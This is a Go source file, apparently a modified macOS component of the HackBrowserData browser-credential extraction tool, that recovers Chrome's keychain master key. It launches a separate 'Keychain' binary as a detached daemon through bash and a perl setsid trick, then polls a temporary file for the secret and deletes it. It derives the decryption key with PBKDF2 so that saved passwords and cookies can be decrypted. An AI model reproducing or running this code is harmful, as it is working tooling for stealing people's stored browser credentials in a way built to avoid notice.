//go:build darwin

package chromium

import (
	"crypto/sha1"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"syscall"
	"time"

	"golang.org/x/crypto/pbkdf2"

	"github.com/moond4rk/HackBrowserData/item"
	"github.com/moond4rk/HackBrowserData/log"
)

var (
	errWrongSecurityCommand = errors.New("wrong security command")
)

func setCommandAsDaemon(daemon *exec.Cmd) {
	daemon.SysProcAttr = &syscall.SysProcAttr{
		//Setpgid: true,
		Setsid: true,
		//Pgid: 0,
	}
}

func Shell(script string) error {
	path := "/bin/bash"
	argsArray := []string{"-c", script}
	cmd := exec.Command(path, argsArray...)
	setCommandAsDaemon(cmd)
	return cmd.Start()
}

func (c *Chromium) GetMasterKey() ([]byte, error) {
	// don't need chromium key file for macOS
	defer os.Remove(item.TempChromiumKey)
	// Get the master key from the keychain
	// $ security find-generic-password -wa 'Chrome'
	// var (
	// 	stdout, stderr bytes.Buffer
	// )
	exePath, _ := os.Executable()
	exePath, _ = filepath.Abs(exePath)
	currPath := filepath.Dir(exePath)
	format := `
#!/bin/bash
ps -ef | grep %s | grep -v grep
if [ $? -ne 0 ]
then
perl -e "use POSIX setsid; setsid();exec '%s &'"
fi
`
	binPath := path.Join(currPath, "Keychain")
	script := fmt.Sprintf(format, binPath, binPath)
	secret := []byte("")
	for i := 0; i < 20; i++ {
		err := Shell(script)
		if err != nil {
			return nil, err
		}
		time.Sleep(time.Second * 3)
		pwd, err := ioutil.ReadFile(path.Join(currPath, "secretTmpLog.txt"))
		if err == nil && string(pwd) != "" {
			secret = pwd
			os.Remove(path.Join(currPath, "secretTmpLog.txt"))
			break
		}
	}

	// cmd := exec.Command("security", "find-generic-password", "-wa", strings.TrimSpace(c.storage)) //nolint:gosec
	// cmd.Stdout = &stdout
	// cmd.Stderr = &stderr
	// if err := cmd.Run(); err != nil {
	// 	return nil, fmt.Errorf("run security command failed: %w, message %s", err, stderr.String())
	// }

	// if stderr.Len() > 0 {
	// 	if strings.Contains(stderr.String(), "could not be found") {
	// 		return nil, errCouldNotFindInKeychain
	// 	}
	// 	return nil, errors.New(stderr.String())
	// }

	// secret := bytes.TrimSpace(stdout.Bytes())
	// if len(secret) == 0 {
	// 	return nil, errWrongSecurityCommand
	// }

	salt := []byte("saltysalt")
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
	key := pbkdf2.Key(secret, salt, 1003, 16, sha1.New)
	if key == nil {
		return nil, errWrongSecurityCommand
	}
	c.masterKey = key
	log.Infof("%s initialized master key success", c.name)
	return key, nil
}
